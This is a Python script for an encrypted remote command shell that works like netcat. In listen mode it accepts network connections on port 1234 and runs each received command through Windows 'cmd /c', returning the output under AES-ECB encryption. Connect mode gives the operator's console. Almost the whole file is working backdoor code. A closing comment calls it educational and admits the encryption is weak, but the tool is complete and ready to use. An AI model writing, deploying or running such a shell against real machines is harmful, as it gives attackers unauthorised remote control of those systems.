import socket, subprocess, threading, argparse
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

DEFAULT_PORT = 1234
MAX_BUFFER = 4096

class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_ECB)
    
    def encrypt(self, plaintext):
        return self.cipher.encrypt(pad(plaintext, AES.block_size)).hex()

    def decrypt(self, encrypted_data):
        return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted_data)), AES.block_size)
    
    def __str__(self) -> str:
        return "Key => " + self.key.hex()
    
def encrypted_send(s, msg):
    s.send(cipher.encrypt(msg).encode("latin-1"))

def execute_cmd(cmd):
    try:
        output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT) 
        return output
    except Exception as e:
        output = b"Failed to execute command"
    return output

#res = execute_cmd("whoami")
#print(res)

def decode_and_strip(s):
    return s.decode("latin-1").strip()

# Waiting for command from user in an infinte loop. When a command is recieved it is either execute or we exit the loop if any error
def shell_thread(s):
    encrypted_send(s, b"[-- Conencted --]\n")
    try:
        while True:
            encrypted_send(s, b"\r\nEnter command> ")
            data = s.recv(MAX_BUFFER)
            if data:
                buffer = cipher.decrypt(decode_and_strip(data))
                buffer = decode_and_strip(buffer)

                if not buffer or buffer == "exit":
                    s.close() 
                    exit()

            print("> Executing command: {}".format(buffer))
            encrypted_send(s, execute_cmd(buffer))
    except Exception as e:
        s.close()
        exit()

# Need to be able to run the script in both client and server mode. Therefore we need functions to listen and accept connections and also initiate connections

def send_data(s):
    try:
        while True:
            data = input() + "\n"
            encrypted_send(s, data.encode("latin-1"))
    except Exception as e:
        s.close()
        exit()

def receive_data(s):
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                data = cipher.decrypt(data).decode("latin-1")
                print(data, end="", flush=True)
    except Exception as e:
        s.close()
        exit()

def server_mode():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()
    
    print("[*] Listening on 0.0.0.0:{}".format(DEFAULT_PORT))

    while True:
        client_socket, addr = s.accept()

        print("[*] Accepted connection from {}".format(addr))

        client_thread = threading.Thread(target=shell_thread, args=(client_socket,))
        client_thread.start()

def client_mode(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, DEFAULT_PORT))
    
    print("[*] Connected to {} on port {}".format(host, DEFAULT_PORT))
    
    threading.Thread(target=send_data, args=(s,)).start()
    threading.Thread(target=receive_data, args=(s,)).start()
    

parser = argparse.ArgumentParser()

parser.add_argument("-l", "--listen", action="store_true", help="Listen for incoming connections", required=False)
parser.add_argument("-c", "--connect", help="Connect to a remote host", required=False)
parser.add_argument("-k", "--key", help="Encryption key", type=str, required=False)

args = parser.parse_args()

if args.connect and not args.key:
    parser.error("--connect requires --key")

if args.key:
    cipher = AESCipher(bytearray.fromhex(args.key))
else:
    cipher = AESCipher()

print(cipher)

if args.listen:
    server_mode()
elif args.connect:
    client_mode(args.connect)

# The encryption is weak and can be easily broken, However this program is for educational purposes and only to demostrate the concept